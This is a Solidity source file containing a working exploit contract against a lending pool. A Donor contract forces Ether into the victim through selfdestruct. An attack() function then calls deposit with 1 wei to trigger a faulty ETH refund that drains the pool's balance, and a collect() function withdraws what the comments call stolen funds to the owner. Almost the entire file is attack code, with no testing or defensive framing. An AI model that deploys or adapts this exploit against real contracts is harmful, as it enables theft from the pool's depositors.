// SPDX-License-Identifier: MIT
pragma solidity ^0.8.0;

/// @notice Minimal interface for the vulnerable LendingPool deposit function
interface ILendingPool {
    function deposit(
        uint256 reserveId,
        uint256 amount,
        address onBehalfOf,
        uint16 referralCode
    ) external payable returns (uint256);
}

/// @notice Helper contract to forcibly send Ether via self-destruct
contract Donor {
    constructor() payable {}

    function donate(address payable target) external {
        selfdestruct(target);
    }
}

/// @notice Exploit contract demonstrating the donate‑and‑steal attack
contract Exploit {
    address public immutable owner;
    address payable public immutable victim;
    Donor public donor;

    modifier onlyOwner() {
        require(msg.sender == owner, "Not owner");
        _;
    }

    /// @param _victim Address of the vulnerable contract
    /// @dev Deploy with some Ether funding for the donor
    constructor(address payable _victim) payable {
        owner = msg.sender;
        victim = _victim;
        // Deploy a funded Donor contract
        donor = (new Donor){value: msg.value}();
    }

    /// @notice Perform the donate-and-steal sequence
    function attack() external onlyOwner {
        // 1) Donate all donated Ether to victim via self-destruct
        donor.donate(victim);

        // 2) Trigger the vulnerable refundETH by calling deposit with minimal msg.value
        //    This will cause the victim to send its entire balance back to this contract
        ILendingPool(victim).deposit{value: 1}(1, 0, address(this), 0);
    }

    /// @notice Withdraw stolen funds to a recipient
    function collect(address payable to) external onlyOwner {
        to.transfer(address(this).balance);
    }

    /// @notice Allow receiving Ether
    receive() external payable {}
}
